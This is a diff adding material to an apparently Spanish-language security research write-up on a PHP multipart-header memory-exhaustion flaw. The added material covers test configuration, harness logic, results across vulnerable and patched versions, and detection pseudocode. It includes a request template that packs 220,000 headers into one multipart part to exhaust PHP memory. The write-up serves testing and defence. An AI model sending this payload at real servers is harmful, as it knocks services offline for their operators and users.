@@ -55,10 +55,42 @@ Probamos las parejas 8.2.34/8.2.35, 8.3.35/8.3.36, 8.4.26/8.4.27 y
 pequeño permitió observar la amplificación interna sin depender de grandes
 volúmenes de tráfico.
 
+La base relevante de configuración fue idéntica entre builds:
+
+```ini
+memory_limit = 8M
+post_max_size = 64M
+upload_max_filesize = 32M
+max_input_vars = 1000000
+
+session.upload_progress.enabled = 1
+session.upload_progress.cleanup = 1
+session.use_cookies = 1
+session.serialize_handler = php
+```
+
 El cuerpo principal contenía una sola parte de archivo y 220.000 headers de
 parte. Las cuatro versiones vulnerables terminaron con un fatal por agotamiento
 de memoria. Las cuatro versiones corregidas completaron el parseo y ejecutaron
 el script. Repetimos la matriz dos veces después de validar el harness.
+
+La forma del request era deliberadamente simple. El volumen estaba dentro de
+los headers de una única parte multipart:
+
+```http
+POST /worker.php HTTP/1.1
+Content-Type: multipart/form-data; boundary=adversario-lab
+
+--adversario-lab
+Content-Disposition: form-data; name="file"; filename="probe.txt"
+X-F0: hhhhhhhhhhhh
+X-F1: hhhhhhhhhhhh
+...
+X-F219999: hhhhhhhhhhhh
+
+x
+--adversario-lab--
+```
 
 La respuesta HTTP y el código de salida no bastaron como prueba. Nuestro primer
 cliente FastCGI tenía dos errores de framing y una fixture de PowerShell
@@ -66,6 +98,40 @@ expandía variables que debían quedar literales. En las primeras corridas, un
 404 con un estado aparentemente correcto podía parecer una ejecución válida.
 Desde ese punto exigimos un marcador emitido por la aplicación después del
 parseo. Las corridas anteriores quedaron invalidadas.
+
+El endpoint de control no hacía trabajo adicional. Solo confirmaba que PHP
+había terminado de construir las variables de entrada y alcanzado la
+aplicación:
+
+```php
+<?php
+register_shutdown_function(static function (): void {
+    echo "[shutdown-reached]\n";
+});
+
+printf(
+    "[app] version=%s sapi=%s files=%d\n",
+    PHP_VERSION,
+    PHP_SAPI,
+    count($_FILES)
+);
+```
+
+En el harness, un resultado solo entraba a la matriz si contenía el marcador
+correspondiente. Un status o un `appStatus=0` aislado quedaban clasificados como
+indeterminados:
+
+```python
+reached_app = b"[app]" in response_body
+reached_shutdown = b"[shutdown-reached]" in response_body
+
+if not reached_app and not fatal_oom:
+    verdict = "INDETERMINATE"
+elif reached_app:
+    verdict = "PARSE_COMPLETE"
+else:
+    verdict = "FATAL_OOM"
+```
 
 La lección es aplicable a cualquier trabajo de exploit development: una señal
 del transporte demuestra que el servidor respondió; solamente un marcador
@@ -77,6 +143,17 @@ El resultado más distintivo apareció en Apache `mod_php` sobre Windows. Hicimo
 un sweep de seis tamaños, con tres repeticiones por tamaño, sobre PHP 8.4.26 y
 8.4.27. La versión vulnerable agotó los 8 MiB desde 140.000 headers. La versión
 corregida procesó 260.000 bajo el mismo límite.
+
+El resumen del sweep tenía esta forma:
+
+```text
+headers    PHP 8.4.26             PHP 8.4.27
+-------    --------------------   --------------------
+140000     FATAL_OOM  (3/3)       PARSE_COMPLETE (3/3)
+180000     FATAL_OOM  (3/3)       PARSE_COMPLETE (3/3)
+220000     FATAL_OOM  (3/3)       PARSE_COMPLETE (3/3)
+260000     FATAL_OOM  (3/3)       PARSE_COMPLETE (3/3)
+```
 
 Esta diferencia no convierte un fatal OOM en ejecución de código. Sí muestra un
 cambio observable en la contabilidad o representación del parseo después del
@@ -182,6 +259,23 @@ cantidades anómalas de headers o campos, fatals de memoria durante el parseo,
 caídas o churn de workers, cookies PHPSESSID inusuales y archivos de sesión
 vacíos creados en la misma ventana. Los literales de PoC públicos son pistas
 temporales y fáciles de modificar.
+
+Una búsqueda inicial puede expresar esa correlación sin convertir cada evento
+aislado en una alerta crítica. El siguiente pseudocódigo muestra la lógica, no
+una consulta específica de proveedor:
+
+```sql
+SELECT host, time_bucket('1 minute', timestamp) AS window
+FROM security_events
+WHERE event IN (
+  'multipart_header_anomaly',
+  'php_memory_limit_exhausted',
+  'php_worker_crash',
+  'zero_byte_session_created'
+)
+GROUP BY host, window
+HAVING COUNT(DISTINCT event) >= 2;
+```
 
 Finalmente, un PoC recién publicado merece el mismo tratamiento que cualquier
 binario desconocido: revisión estática, eliminación de destinos embebidos,
